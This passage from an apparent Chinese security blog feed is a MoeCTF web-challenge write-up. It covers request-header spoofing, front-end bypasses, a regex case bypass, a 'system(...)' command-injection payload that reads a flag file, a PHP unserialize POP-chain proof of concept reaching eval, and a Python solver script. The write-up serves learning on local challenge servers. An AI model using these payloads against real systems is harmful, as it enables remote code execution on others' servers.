WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span><span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">verify=admin</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">3</span></span>b=1</code></pre><p>虽然但是，响应头有个<code>fxxk: /flag3.php</code></p><p>啊？难道你不是从 <a href="http://localhost:8080/flag3cad.php?a=1">http://localhost:8080/flag3cad.php?a=1</a> 点击链接过来的吗？<br>坏了，肯定是哪里搞错了，要不你看看能不能自己临时凑合凑合？</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:8080/flag3cad.php?a=1</span></span></code></pre><p><img src="7ball_3.png" loading="lazy"></p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;head&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;    &lt;title&gt;flag4&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;ok, 你成功闯入了第四关！&lt;br&gt;本关考验你听声辩位的功夫，你需要按下开始按钮后，根据提示按下相应的按钮。&lt;br&gt;&lt;button onclick&#x3D;&quot;start()&quot;&gt;开始&lt;&#x2F;button&gt;&lt;span id&#x3D;&quot;num&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;div id&#x3D;&quot;scope&quot;&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;1&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;2&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;3&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;4&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;5&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;6&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;7&lt;&#x2F;button&gt;    &lt;button onclick&#x3D;&quot;getID(this)&quot;&gt;8&lt;&#x2F;button&gt;&lt;&#x2F;div&gt;&lt;script&gt;    var buttons &#x3D; document.getElementById(&quot;scope&quot;).getElementsByTagName(&quot;button&quot;);    for (var i &#x3D; 0; i &lt; buttons.length; i++) &#123;        buttons[i].id &#x3D; i + 1;    &#125;    function start() &#123;        document.getElementById(&quot;num&quot;).innerText &#x3D; &quot;9&quot;;    &#125;    function getID(button) &#123;        if (button.id &#x3D;&#x3D; 9) &#123;            alert(&quot;你过关！（铜人震声）\n我们使用 console.log 来为你生成 flag&quot;);            fetch(&#39;flag4bbc.php&#39;, &#123;                method: &#39;post&#39;,                body: &#39;method&#x3D;get&#39;,                headers: &#123;                    &#39;Content-Type&#39;: &#39;application&#x2F;x-www-form-urlencoded&#39;,                &#125;,            &#125;).then((data) &#x3D;&gt; &#123;                return data.json();            &#125;).then((result) &#x3D;&gt; &#123;console.log(result.hint);                console.log(result.fll);                console.log(result.goto)            &#125;);        &#125; else &#123;            alert(&quot;该罚！(头部碰撞声)&quot;)        &#125;    &#125;&lt;&#x2F;script&gt;</code></pre><p>添加一个button即可</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜你！你已经知道，前端的一切都是可以更改的！ flag4: fdFVUMHJ前往：/flag5sxr.php</code></pre><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">checkValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token string">"form"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"content"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>content <span class="token operator">==</span> <span class="token string">"I want flag"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你就这么直接？"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>burp抓包发送</p><pre class="language-markup" data-language="markup"><code class="language-markup">恭喜，我相信你已经深刻了解了前端不可信任的道理!flag5: fSV90aDF</code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag6diw.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'moe'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"flag6: xxx"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>提示已经很明显了，大小写绕过</p><pre class="language-markup" data-language="markup"><code class="language-markup">flag6: rZV9VX2t</code></pre><p><img src="7ball_4.png" loading="lazy"></p><pre class="language-markup" data-language="markup"><code class="language-markup">POST: what=system('tac /flag7');flag7:rbm93X1dlQn0=</code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">flag: bW9lY3Rme0FmdEVyX3RoMXNfdFVUMHJfSV90aDFrZV9VX2trbm93X1dlQn0= base64-->      moectf&#123;AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB&#125;</code></pre><h4 id="pop-moe"><a href="#pop-moe" class="headerlink" title="pop moe"></a>pop moe</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$what</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FAILED TO ATTACK'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">what</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">payload</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">payl0ad</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$sec</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">dangerous</span><span class="token punctuation">(</span><span class="token variable">$whaattt</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$whaattt</span><span class="token operator">-></span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">sec</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">evvval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">mystr</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>可以利用的函数是<code>class003</code>类的<code>evvval</code>函数里的<code>eval</code>，然后反推看看怎么触发。</p><p>1.<code>class002</code>类的<code>dangerous</code>函数，如果<code>$whaattt</code>为<code>class003</code>类，就可以触发<code>evvval</code></p><p>2.同类下的<code>__set</code>可以触发<code>dangerous</code>，<code>$b</code>为<code>dangerous</code>，<code>$sec</code>就是要传递的参数，就是<code>class003</code></p><p>3.同时我们发现一个问题，如果此时<code>$sec</code>为<code>class003</code>，那么作为<code>evvval</code>函数的参数，要求传入的变量是字符串，但是我们传入的是一个类，进而就会触发<code>__tostring</code>函数，返回~类的<code>$mystr</code>，所以只要给<code>$mystr</code>赋值，就解决了<code>eval</code>函数的参数问题</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//---- 把类当作字符串使用时触发</span></code></pre><p>4.接着反向分析，如何触发<code>__set</code></p><pre class="language-php" data-language="php"><code class="language-php"> <span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//--------- 用于将数据写入不可访问的属性</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Jay"</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$input</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token variable">$test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"David"</span><span class="token punctuation">;</span>  <span class="token comment"># 因为name为私有变量，所以一般来说无法直接赋值的，所以此时会触发__set魔术方法</span><span class="token keyword">echo</span> <span class="token variable">$test</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">;</span>  <span class="token comment"># 输出"David"</span></code></pre><p>在class001类中<code>__invoke</code>函数，如果<code>$a</code>为<code>class002</code>，那么在<code>class002</code>中并没有<code>payload</code>这样的属性，于是会触发<code>class002</code>中的<code>__set</code>，此时<code>$this-&gt;payl0ad</code>即为上述例子中的<code>$input</code>，也是题目中<code>__set</code>中的<code>$b</code>，所以只需要让<code>$payl0ad</code>为<code>dangerous</code>即可</p><p>5.如何触发<code>__invoke</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//------ 当尝试将对象调用为函数时触发</span></code></pre><p>很容易发现只需要将<code>class000</code>类中的<code>$what</code>赋值为<code>class001</code>即可触发<code>__invoke()</code></p><p>至此，完整的pop链为</p><pre class="language-php" data-language="php"><code class="language-php">class000<span class="token operator">.</span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class000</span><span class="token operator">.</span><span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class001</span><span class="token operator">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">__set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class002</span><span class="token operator">.</span><span class="token function">dangerous</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">evvval</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token property">class003</span><span class="token operator">.</span><span class="token function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>POC:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class000</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$what</span><span class="token punctuation">;</span> <span class="token comment">// protected</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class001</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$payl0ad</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'dangerous'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class002</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sec</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">class003</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$mystr</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class000</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">class001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">class003</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">what</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">-></span><span class="token property">sec</span><span class="token operator">-></span><span class="token property">mystr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo();"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-markup" data-language="markup"><code class="language-markup">moectf&#123;1T_sEEmS_tH@t-YOU_Know-WH4t-is-pOP-lN_pHPpPpPPp!!!39&#125; </code></pre><h4 id="勇闯铜人阵"><a href="#勇闯铜人阵" class="headerlink" title="勇闯铜人阵"></a>勇闯铜人阵</h4><p><img src="spider.png" loading="lazy"></p><p>有时间限制，所以基本思路就是写脚本通关</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">def</span> <span class="token function">getKeyword</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>    beautiful_soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>    key_text <span class="token operator">=</span> beautiful_soup<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"h1"</span><span class="token punctuation">,</span> <span class="token builtin">id</span><span class="token operator">=</span><span class="token string">"status"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key_text<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> key_textdirect_dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token string">"北方一个"</span><span class="token punctuation">,</span>    <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token string">"东北方一个"</span><span class="token punctuation">,</span>    <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token string">"东方一个"</span><span class="token punctuation">,</span>    <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token string">"东南方一个"</span><span class="token punctuation">,</span>    <span class="token string">'5'</span><span class="token punctuation">:</span> <span class="token string">"南方一个"</span><span class="token punctuation">,</span>    <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token string">"西南方一个"</span><span class="token punctuation">,</span>    <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token string">"西方一个"</span><span class="token punctuation">,</span>    <span class="token string">'8'</span><span class="token punctuation">:</span> <span class="token string">"西北方一个"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"http://localhost:7650/"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span></span><span class="token string">restart"</span></span><span class="token punctuation">)</span>getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>post_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"player"</span><span class="token punctuation">:</span> <span class="token string">"hsad"</span><span class="token punctuation">,</span>    <span class="token string">"direct"</span><span class="token punctuation">:</span> <span class="token string">"弟子明白"</span><span class="token punctuation">&#125;</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>response <span class="token operator">=</span> session<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 7, 1</span>    res <span class="token operator">=</span> getKeyword<span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(\d+)'</span><span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    <span class="token comment"># print(match)</span>    number <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token keyword">match</span><span class="token punctuation">]</span>    <span class="token comment"># print(number)</span>    <span class="token keyword">if</span> <span class="token string">', '</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">，</span><span class="token interpolation"><span class="token punctuation">&#123;</span>direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        post_data<span class="token punctuation">[</span><span class="token string">'direct'</span><span class="token punctuation">]</span> <span class="token operator">=</span> direct_dic<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>number<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>post_data<span class="token punctuation">)</span>    response <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>post_data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token comment"># print(response.text)</span>    <span class="token keyword">if</span> res <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> <span class="token string">'moectf'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'moectf(.*)'</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-6]</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p><img src="spider_2.png" loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> 安全相关 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MoeCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KaliLinux的基本配置</title>
      <link href="/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
      <url>/2024/08/09/KaliLinux%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</url>
      
